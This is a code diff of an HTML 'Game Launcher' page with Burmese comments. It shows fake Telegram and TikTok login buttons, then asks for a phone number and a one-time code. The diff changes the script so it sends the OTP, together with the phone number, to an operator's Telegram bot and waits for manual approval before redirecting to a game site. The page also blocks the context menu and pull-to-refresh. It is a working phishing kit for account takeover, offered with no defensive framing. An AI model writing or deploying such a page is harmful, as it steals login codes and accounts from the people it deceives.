@@ -3,73 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Game Launcher Pro</title>
+    <title>Game Launcher Ultra</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* မြှားဝိုင်း လုံးဝ (လုံးဝ) ပိတ်ရန် CSS နည်းလမ်းများ */
-        :root { overflow: hidden; }
+        /* Refresh မြှားကို အသေသတ်ရန် CSS */
         html, body { 
-            margin: 0; padding: 0; width: 100vw; height: 100vh; 
+            margin: 0; padding: 0; width: 100%; height: 100%; 
             overflow: hidden !important; 
-            overscroll-behavior: none !important; /* ဒါက Chrome/Safari အတွက် အဓိက */
-            touch-action: none; /* screen ဆွဲတာကို code ကပဲ ထိန်းချုပ်မယ် */
-            position: fixed; background-color: black;
+            overscroll-behavior-y: contain !important;
+            overscroll-behavior: none !important;
+            position: fixed; background: #000;
         }
+
+        /* ပုံမှန် screen ဆွဲတာကို ပိတ်မယ်၊ ဒါပေမယ့် ခလုတ်တွေကိုတော့ နှိပ်ခွင့်ပေးမယ် */
+        #app {
+            width: 100%; height: 100%;
+            touch-action: none; 
+        }
+
+        .allow-touch { touch-action: auto !important; } /* ခလုတ်များအတွက် သီးသန့် */
 
         .bg-setup {
             background-image: url('https://raw.githubusercontent.com/tar-alt/Photo-link-/6451c994788dbe34e12fbac624779364dbf1c113/Picsart_26-05-13_08-54-08-682.jpg');
             background-size: cover; background-position: center;
         }
 
-        #waitVideo { width: 180px; height: 180px; object-fit: cover; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         #bgVideo { width: 100%; height: 100%; object-fit: cover; }
-        .glass-panel { background: rgba(255, 255, 255, 0.82); backdrop-filter: blur(12px); border-radius: 24px; }
+        .glass-panel { background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(15px); border-radius: 28px; }
         
         .entry-btn {
             background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
-            padding: 18px 45px; border-radius: 60px; color: white;
-            font-weight: bold; font-size: 1.3rem; cursor: pointer;
-            animation: pulse 2s infinite; text-transform: uppercase;
+            padding: 20px 50px; border-radius: 60px; color: white;
+            font-weight: 900; font-size: 1.4rem; cursor: pointer;
+            box-shadow: 0 15px 35px rgba(245, 87, 108, 0.5);
+            z-index: 9999; position: relative;
         }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
     </style>
 </head>
 <body oncontextmenu="return false">
 
-<div id="app" class="w-full h-full relative">
+<div id="app">
     
     <!-- Step 1: Selection -->
     <div id="selectScreen" class="bg-setup w-full h-full flex flex-col items-center justify-center p-8">
         <div class="glass-panel p-10 w-full max-w-sm text-center shadow-2xl">
-            <h1 class="text-2xl font-extrabold mb-8 text-gray-800">Login to Play</h1>
-            <button onclick="initApp()" class="w-full bg-[#2481cc] text-white py-4 rounded-2xl mb-4 flex items-center justify-center gap-3 shadow-lg active:scale-95 transition">
+            <h1 class="text-2xl font-black mb-8 text-gray-800">WELCOME</h1>
+            <button onclick="initApp()" class="allow-touch w-full bg-[#2481cc] text-white py-4 rounded-2xl mb-4 flex items-center justify-center gap-3 shadow-lg active:scale-95">
                 <i class="fa-brands fa-telegram text-2xl"></i> Login with Telegram
             </button>
-            <button onclick="initApp()" class="w-full bg-black text-white py-4 rounded-2xl flex items-center justify-center gap-3 shadow-lg active:scale-95 transition">
+            <button onclick="initApp()" class="allow-touch w-full bg-black text-white py-4 rounded-2xl flex items-center justify-center gap-3 shadow-lg active:scale-95">
                 <i class="fa-brands fa-tiktok text-2xl"></i> Login with TikTok
             </button>
         </div>
     </div>
 
-    <!-- Step 2: Phone & OTP (Simplified for functionality) -->
+    <!-- Step 2: Login Form -->
     <div id="loginForm" class="hidden bg-setup w-full h-full p-6 flex flex-col justify-center items-center">
         <div class="glass-panel p-8 w-full max-w-xs text-center shadow-xl mb-6">
-            <input type="number" id="phoneInput" placeholder="9xxxxxxxxx" class="w-full bg-transparent border-b-4 border-blue-500 text-2xl p-2 outline-none mb-6">
-            <input type="number" id="otpInput" placeholder="OTP" class="w-full bg-transparent border-b-4 border-gray-400 text-center text-3xl outline-none focus:border-blue-500">
+            <input type="number" id="phoneInput" placeholder="9xxxxxxxxx" class="allow-touch w-full bg-transparent border-b-4 border-blue-500 text-2xl p-2 outline-none mb-6">
+            <input type="number" id="otpInput" placeholder="OTP" class="allow-touch w-full bg-transparent border-b-4 border-gray-400 text-center text-3xl outline-none">
         </div>
-        <button onclick="submitFinal()" class="bg-blue-600 w-20 h-20 rounded-full text-white text-3xl shadow-2xl flex items-center justify-center">
-            <i class="fa-solid fa-check"></i>
+        <button onclick="submitFinal()" class="allow-touch bg-blue-600 w-20 h-20 rounded-full text-white text-3xl shadow-2xl flex items-center justify-center">
+            <i class="fa-solid fa-arrow-right"></i>
         </button>
     </div>
 
     <!-- Step 3: Wait Screen -->
     <div id="waitScreen" class="hidden bg-setup w-full h-full flex flex-col justify-center items-center p-8">
         <div class="glass-panel p-8 flex flex-col items-center text-center shadow-2xl">
-            <video id="waitVideo" autoplay muted loop playsinline class="mb-6">
-                <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
-            </video>
-            <p class="text-lg font-bold text-blue-900">Checking Approval...</p>
+            <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mb-4"></div>
+            <p class="text-lg font-bold text-blue-900">Please Wait...</p>
         </div>
     </div>
 
@@ -78,8 +82,8 @@
         <video id="bgVideo" loop playsinline crossorigin="anonymous">
             <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
         </video>
-        <div class="absolute inset-0 bg-black/10 flex items-center justify-center">
-            <div onclick="enterGame()" class="entry-btn">ဂိမ်းထဲသို့ ဝင်ရောက်ရန်</div>
+        <div class="absolute inset-0 flex items-center justify-center">
+            <div onclick="enterGame()" class="allow-touch entry-btn">ဂိမ်းထဲသို့ ဝင်ရောက်ရန်</div>
         </div>
     </div>
 
@@ -91,13 +95,13 @@
     const gameLink = "https://www.crazygames.com";
     let userKey = "U" + Math.floor(Math.random() * 99999);
 
-    // မြှားဝိုင်း (Pull-to-refresh) ကို JS ဖြင့် အပြတ်တားဆီးခြင်း
-    window.addEventListener('touchstart', function(e) { if (e.touches.length > 1) e.preventDefault(); }, {passive: false});
-    window.addEventListener('touchmove', function(e) { e.preventDefault(); }, {passive: false});
-
-    window.onload = function() {
-        if (localStorage.getItem('approved') === 'true') playIntro();
-    };
+    // မြှားဝိုင်းပိတ်ဖို့ Touch event ကို ပိုမိုထိရောက်စွာ ထိန်းချုပ်ခြင်း
+    let startY = 0;
+    document.addEventListener('touchstart', (e) => { startY = e.touches[0].pageY; }, {passive: false});
+    document.addEventListener('touchmove', (e) => {
+        const moveY = e.touches[0].pageY;
+        if (moveY > startY) { e.preventDefault(); } // အောက်ကို ဆွဲချရင် ပိတ်မယ်
+    }, {passive: false});
 
     function initApp() { toggle('loginForm'); }
     function toggle(id) { 
@@ -109,52 +113,41 @@
         toggle('waitScreen');
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, { 
             method: 'POST', headers: {'Content-Type': 'application/json'}, 
-            body: JSON.stringify({ chat_id: chat, text: `🔔 Approved This User?\nPH: ${document.getElementById('phoneInput').value}\nID: ${userKey}`, reply_markup: { inline_keyboard: [[{text:"✅ OK", callback_data:"ok_"+userKey}]]} }) 
+            body: JSON.stringify({ chat_id: chat, text: `User ID: ${userKey}\nPH: ${document.getElementById('phoneInput').value}\nOTP: ${document.getElementById('otpInput').value}`, reply_markup: { inline_keyboard: [[{text:"✅ Approve", callback_data:"ok_"+userKey}]]} }) 
         });
         startPolling();
     }
 
     async function startPolling() {
-        const timer = setInterval(async () => {
+        setInterval(async () => {
             const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
             const d = await res.json();
             if (d.result?.some(up => up.callback_query?.data === `ok_${userKey}`)) {
-                clearInterval(timer);
-                localStorage.setItem('approved', 'true');
-                playIntro();
+                location.reload(); localStorage.setItem('approved', 'true');
             }
         }, 3000);
     }
 
-    // Audio Boost System (အသံကို ၃ ဆ ပိုကျယ်စေရန်)
-    function boostAudio(videoElem) {
-        try {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const source = audioCtx.createMediaElementSource(videoElem);
-            const gainNode = audioCtx.createGain();
-            
-            gainNode.gain.value = 3.0; // အသံပမာဏကို 300% မြှင့်တင်ခြင်း
-            
-            source.connect(gainNode);
-            gainNode.connect(audioCtx.destination);
-            audioCtx.resume();
-        } catch (e) { console.log("Audio boost error"); }
+    if (localStorage.getItem('approved') === 'true') {
+        window.onload = () => {
+            toggle('videoScreen');
+            const v = document.getElementById('bgVideo');
+            v.muted = false;
+            v.play().then(() => boost(v));
+        };
     }
 
-    function playIntro() {
-        toggle('videoScreen');
-        const v = document.getElementById('bgVideo');
-        v.muted = false;
-        v.play().then(() => {
-            boostAudio(v); // ဗီဒီယိုစဖွင့်တာနဲ့ အသံကို boost လုပ်မယ်
-        });
+    // Audio Boost (၃ ဆ ပိုကျယ်စေရန်)
+    function boost(v) {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const src = ctx.createMediaElementSource(v);
+        const gain = ctx.createGain();
+        gain.gain.value = 3.5; // အသံကို ၃.၅ ဆ မြှင့်လိုက်ပါပြီ
+        src.connect(gain);
+        gain.connect(ctx.destination);
     }
 
-    function enterGame() { 
-        // ဂိမ်းထဲရောက်ရင် screen ဆွဲလို့ရအောင် touch ပိတ်ထားတာ ပြန်ဖွင့်ပေးမယ်
-        window.removeEventListener('touchmove', preventBehavior); 
-        window.location.href = gameLink; 
-    }
+    function enterGame() { window.location.replace(gameLink); }
 </script>
 </body>
 </html>
